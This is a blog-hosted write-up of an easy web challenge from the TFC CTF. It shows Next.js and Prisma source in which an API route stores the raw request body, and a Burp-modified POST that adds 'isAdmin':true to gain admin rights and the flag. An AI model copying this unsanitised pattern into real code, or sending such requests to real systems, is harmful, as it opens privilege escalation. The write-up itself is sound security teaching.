<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TFC CTF : Are you the admin? | Sanlokii</title>
<meta name=keywords content="Web,Write-up"><meta name=description content="Web - Easy"><meta name=author content><link rel=canonical href=https://sanlokii.eu/writeups/tfc-ctf/are-you-the-admin/><link crossorigin=anonymous href=/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://sanlokii.eu/assets/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sanlokii.eu/assets/images/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sanlokii.eu/assets/imagesfavicon-32x32.png><link rel=apple-touch-icon href=https://sanlokii.eu/assets/images/apple-touch-icon.png><link rel=mask-icon href=https://sanlokii.eu/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="TFC CTF : Are you the admin?"><meta property="og:description" content="Web - Easy"><meta property="og:type" content="article"><meta property="og:url" content="https://sanlokii.eu/writeups/tfc-ctf/are-you-the-admin/"><meta property="og:image" content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2022-08-01T00:00:00+00:00"><meta property="article:modified_time" content="2022-08-01T00:00:00+00:00"><meta property="og:site_name" content="Sanlokii's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta name=twitter:title content="TFC CTF : Are you the admin?"><meta name=twitter:description content="Web - Easy"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://sanlokii.eu/writeups/"},{"@type":"ListItem","position":2,"name":"TFC CTF : Are you the admin?","item":"https://sanlokii.eu/writeups/tfc-ctf/are-you-the-admin/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TFC CTF : Are you the admin?","name":"TFC CTF : Are you the admin?","description":"Web - Easy","keywords":["Web","Write-up"],"articleBody":"Statement: Do you have what it takes to be the admin?\nThe challenge provides us with the following source code : index.tsx\nimport type { GetServerSideProps, NextPage } from \"next\"; import type { User } from \"@prisma/client\"; import { prisma } from \"../globals/prisma\"; import { useState } from \"react\"; import { useRouter } from \"next/router\"; type Props = { users: (User \u0026 ( | { flag: string; isAdmin: true; } | { flag?: never; isAdmin: false; } ))[]; }; const Home: NextPage\u003cProps\u003e = ({ users }) =\u003e { const [username, setUsername] = useState(\"\"); const router = useRouter(); const create = async () =\u003e { await fetch(\"/api/auth\", { headers: { \"Content-Type\": \"application/json\", }, method: \"POST\", body: JSON.stringify({ username, }), }); await router.replace(router.asPath); }; return ( \u003cdiv\u003e \u003cdiv\u003eCreate user:\u003c/div\u003e \u003cinput value={username} onChange={(event) =\u003e setUsername(event.target.value)} /\u003e \u003cbutton onClick={create}\u003eCreate\u003c/button\u003e \u003cdiv\u003eUsers:\u003c/div\u003e {users.map((user) =\u003e ( \u003cdiv key={user.id}\u003e \u003cdiv\u003eUsername: {user.username}\u003c/div\u003e \u003cdiv\u003eIs admin? {user.isAdmin ? \"yes\" : \"no\"}\u003c/div\u003e {user.isAdmin \u0026\u0026 \u003cdiv\u003e{user.flag}\u003c/div\u003e} \u003c/div\u003e ))} \u003c/div\u003e ); }; export default Home; export const getServerSideProps: GetServerSideProps\u003cProps\u003e = async ( context ) =\u003e { const users = (await prisma.user.findMany()) as Props[\"users\"]; for (const user of users) { if (user.isAdmin) { user.flag = process.env.FLAG!; } } return { props: { users, }, }; }; The file auth.ts:\nimport { NextApiRequest, NextApiResponse } from \"next\"; import { prisma } from \"../../globals/prisma\"; export default async function handler( req: NextApiRequest, res: NextApiResponse ) { const body = req.body; await prisma.user.create({ data: body, }); return res.status(200).end(); And the file schema.prisma:\ngenerator client { provider = \"prisma-client-js\" } datasource db { provider = \"sqlite\" url = \"file:./app.db\" } model User { id String @id @default(uuid()) username String isAdmin Boolean @default(false) } Thanks to the source code made available, we can see that it is possible to add the value isAdmin with the value true in order to authenticate with administrator rights.\nWhen visiting the website and creating a user, the following information is returned:\nUsers: Username: Sanlokii Is admin? no With the Burp Suite tool, I will modify the POST request to add isAdmin value for get the flag!\nDefault POST request:\nPOST /api/auth HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49374 Content-Length: 23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Content-Type: application/json Accept: */* Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374 Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/ Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close {\"username\":\"Sanlokii\"} Modified POST request:\nPOST /api/auth HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49374 Content-Length: 23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Content-Type: application/json Accept: */* Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374 Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/ Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close {\"username\":\"Sanlokii\",\"isAdmin\":true} The website get back the flag with this POST request.\nFlag: TFCCTF{S4n1t1z3_Y0ur_1nput5!}\n","wordCount":"431","inLanguage":"en","datePublished":"2022-08-01T00:00:00Z","dateModified":"2022-08-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanlokii.eu/writeups/tfc-ctf/are-you-the-admin/"},"publisher":{"@type":"Organization","name":"Sanlokii","logo":{"@type":"ImageObject","url":"https://sanlokii.eu/assets/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://sanlokii.eu/ accesskey=h title="Sanlokii (Alt + H)"><img src=https://sanlokii.eu/assets/images/apple-touch-icon.png alt aria-label=logo height=40>Sanlokii</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://sanlokii.eu/writeups/ title=Writeups><span>Writeups</span></a></li><li><a href=https://sanlokii.eu/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://sanlokii.eu/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://sanlokii.eu/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sanlokii.eu/>Home</a>&nbsp;»&nbsp;<a href=https://sanlokii.eu/writeups/>Writeups</a></div><h1 class=post-title>TFC CTF : Are you the admin?</h1><div class=post-description>Web - Easy</div><div class=post-meta>&lt;span title='2022-08-01 00:00:00 +0000 UTC'>August 1, 2022&lt;/span></div></header><div class=post-content><p><strong>Statement:</strong> Do you have what it takes to be the admin?</p><hr><p>The challenge provides us with the following source code : <code>index.tsx</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tsx data-lang=tsx><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#66d9ef>type</span> { <span style=color:#a6e22e>GetServerSideProps</span>, <span style=color:#a6e22e>NextPage</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;next&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#66d9ef>type</span> { <span style=color:#a6e22e>User</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;@prisma/client&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>prisma</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;../globals/prisma&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>useState</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;react&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>useRouter</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;next/router&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>type</span> <span style=color:#a6e22e>Props</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>users</span><span style=color:#f92672>:</span> (<span style=color:#a6e22e>User</span> <span style=color:#f92672>&amp;</span>
</span></span><span style=display:flex><span>    (
</span></span><span style=display:flex><span>      <span style=color:#f92672>|</span> {
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>flag</span>: <span style=color:#66d9ef>string</span>;
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>isAdmin</span>: <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      <span style=color:#f92672>|</span> {
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>flag?</span>: <span style=color:#66d9ef>never</span>;
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>isAdmin</span>: <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ))[];
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>Home</span>: <span style=color:#66d9ef>NextPage</span>&lt;<span style=color:#f92672>Props</span>&gt; <span style=color:#f92672>=</span> ({ <span style=color:#a6e22e>users</span> }) <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> [<span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>setUsername</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>useState</span>(<span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>router</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>useRouter</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>create</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>async</span> () <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;/api/auth&#34;</span>, {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>headers</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Content-Type&#34;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;application/json&#34;</span>,
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;POST&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>body</span>: <span style=color:#66d9ef>JSON.stringify</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>username</span>,
</span></span><span style=display:flex><span>      }),
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>replace</span>(<span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>asPath</span>);
</span></span><span style=display:flex><span>  };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>div</span>&gt;<span style=color:#a6e22e>Create</span> <span style=color:#a6e22e>user</span><span style=color:#f92672>:</span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>input</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span>{<span style=color:#a6e22e>username</span>}
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>onChange</span><span style=color:#f92672>=</span>{(<span style=color:#a6e22e>event</span>) <span style=color:#f92672>=&gt;</span> <span style=color:#a6e22e>setUsername</span>(<span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>target</span>.<span style=color:#a6e22e>value</span>)}
</span></span><span style=display:flex><span>      /&gt;
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>onClick</span><span style=color:#f92672>=</span>{<span style=color:#a6e22e>create</span>}&gt;<span style=color:#a6e22e>Create</span>&lt;/<span style=color:#f92672>button</span>&gt;
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>div</span>&gt;<span style=color:#a6e22e>Users</span><span style=color:#f92672>:</span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>      {<span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>map</span>((<span style=color:#a6e22e>user</span>) <span style=color:#f92672>=&gt;</span> (
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>key</span><span style=color:#f92672>=</span>{<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>id</span>}&gt;
</span></span><span style=display:flex><span>          &lt;<span style=color:#f92672>div</span>&gt;<span style=color:#a6e22e>Username</span><span style=color:#f92672>:</span> {<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span>}&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>          &lt;<span style=color:#f92672>div</span>&gt;<span style=color:#a6e22e>Is</span> <span style=color:#a6e22e>admin</span><span style=color:#f92672>?</span> {<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>isAdmin</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;yes&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;no&#34;</span>}&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>          {<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>isAdmin</span> <span style=color:#f92672>&amp;&amp;</span> &lt;<span style=color:#f92672>div</span>&gt;{<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>flag</span>}&lt;/<span style=color:#f92672>div</span>&gt;}
</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>      ))}
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>default</span> <span style=color:#a6e22e>Home</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>getServerSideProps</span>: <span style=color:#66d9ef>GetServerSideProps</span>&lt;<span style=color:#f92672>Props</span>&gt; <span style=color:#f92672>=</span> <span style=color:#66d9ef>async</span> (
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>context</span>
</span></span><span style=display:flex><span>) <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>users</span> <span style=color:#f92672>=</span> (<span style=color:#66d9ef>await</span> <span style=color:#a6e22e>prisma</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>findMany</span>()) <span style=color:#66d9ef>as</span> <span style=color:#a6e22e>Props</span>[<span style=color:#e6db74>&#34;users&#34;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>user</span> <span style=color:#66d9ef>of</span> <span style=color:#a6e22e>users</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>isAdmin</span>) {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span><span style=color:#f92672>!</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>props</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>users</span>,
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>  };
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>The file <code>auth.ts</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>NextApiRequest</span>, <span style=color:#a6e22e>NextApiResponse</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;next&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>prisma</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;../../globals/prisma&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>default</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>handler</span>(
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>req</span>: <span style=color:#66d9ef>NextApiRequest</span>,
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>: <span style=color:#66d9ef>NextApiResponse</span>
</span></span><span style=display:flex><span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>body</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>prisma</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>create</span>({
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>data</span>: <span style=color:#66d9ef>body</span>,
</span></span><span style=display:flex><span>  });
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>end</span>();
</span></span></code></pre></div><p>And the file <code>schema.prisma</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>generator</span> <span style=color:#a6e22e>client</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>provider</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;prisma-client-js&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>datasource</span> <span style=color:#a6e22e>db</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>provider</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sqlite&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>url</span>      <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;file:./app.db&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>model</span> <span style=color:#a6e22e>User</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>id</span>       String  <span style=color:#960050;background-color:#1e0010>@</span><span style=color:#a6e22e>id</span> <span style=color:#960050;background-color:#1e0010>@</span><span style=color:#66d9ef>default</span>(<span style=color:#a6e22e>uuid</span>())
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>username</span> String
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>isAdmin</span>  Boolean <span style=color:#960050;background-color:#1e0010>@</span><span style=color:#66d9ef>default</span>(<span style=color:#66d9ef>false</span>)
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Thanks to the source code made available, we can see that it is possible to add the value <code>isAdmin</code> with the value <code>true</code> in order to authenticate with administrator rights.</p><p>When visiting the website and creating a user, the following information is returned:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>Users:
</span></span><span style=display:flex><span>Username: Sanlokii
</span></span><span style=display:flex><span>Is admin? no
</span></span></code></pre></div><p>With the Burp Suite tool, I will modify the POST request to add <code>isAdmin</code> value for get the flag!</p><p>Default POST request:</p><pre tabindex=0><code>POST /api/auth HTTP/1.1
Host: 01.linux.challenges.ctf.thefewchosen.com:49374
Content-Length: 23
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374
Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{&#34;username&#34;:&#34;Sanlokii&#34;}
</code></pre><p>Modified POST request:</p><pre tabindex=0><code>POST /api/auth HTTP/1.1
Host: 01.linux.challenges.ctf.thefewchosen.com:49374
Content-Length: 23
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374
Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{&#34;username&#34;:&#34;Sanlokii&#34;,&#34;isAdmin&#34;:true}
</code></pre><p>The website get back the flag with this POST request.</p><p>Flag: <code>TFCCTF{S4n1t1z3_Y0ur_1nput5!}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sanlokii.eu/tags/web/>Web</a></li><li><a href=https://sanlokii.eu/tags/write-up/>Write-up</a></li></ul><nav class=paginav><a class=prev href=https://sanlokii.eu/writeups/downunderctf/shop-oi-get-out-of-there/><span class=title>« Prev</span><br><span>DownUnderCTF : Shop-Oi! Get out of there!</span>
</a><a class=next href=https://sanlokii.eu/writeups/tfc-ctf/deeplinks/><span class=title>Next »</span><br><span>TFC CTF : Deeplinks</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TFC CTF : Are you the admin? on twitter" href="https://twitter.com/intent/tweet/?text=TFC%20CTF%20%3a%20Are%20you%20the%20admin%3f&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2ftfc-ctf%2fare-you-the-admin%2f&amp;hashtags=Web%2cWrite-up"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share TFC CTF : Are you the admin? on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2ftfc-ctf%2fare-you-the-admin%2f&amp;title=TFC%20CTF%20%3a%20Are%20you%20the%20admin%3f&amp;summary=TFC%20CTF%20%3a%20Are%20you%20the%20admin%3f&amp;source=https%3a%2f%2fsanlokii.eu%2fwriteups%2ftfc-ctf%2fare-you-the-admin%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://sanlokii.eu/>Sanlokii</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>